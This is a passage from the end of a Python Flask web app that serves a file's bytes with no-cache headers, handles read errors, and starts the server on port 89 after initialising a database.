    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    
    try:
        with open(file_path, 'rb') as f:
            response.data = f.read()
        return response
    except Exception as e:
        print(f"Error serving file {file_path}: {e}")
        return "Error serving file", 500

if __name__ == "__main__":
    initdb()
    app.run("0.0.0.0", port=89, debug=False)